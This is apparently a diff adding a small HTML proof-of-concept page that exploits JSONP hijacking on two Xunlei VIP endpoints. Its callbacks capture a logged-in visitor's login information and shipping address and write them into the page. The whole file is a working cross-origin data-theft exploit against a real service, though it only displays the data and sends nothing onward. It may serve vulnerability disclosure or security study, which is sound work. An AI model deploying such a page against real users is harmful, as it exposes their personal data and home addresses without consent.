@@ -1,0 +1,21 @@
+<html>
+<head>
+    
+</head>
+<body>
+    <p id="j_logininit"></p>
+     <p id="j_address"></p>
+</body>
+<script>
+    var logininit = function(){
+        document.getElementById('j_logininit').innerHTML = 'logininit: '+ JSON.stringify(arguments)
+    }
+   
+    var address = function(){
+        document.getElementById('j_address').innerHTML = '收货地址: '+ JSON.stringify(arguments)
+    }
+</script>
+<script src="http://dyactive2.vip.xunlei.com/iface/?callback=logininit&actid=vip2017openday9&action=logininit&_=1505731236191"></script>
+
+<script src="http://dyactive.vip.xunlei.com/address/?type=info&opt=getaddr&callback=address&_=1505731236186"></script>
+</html>
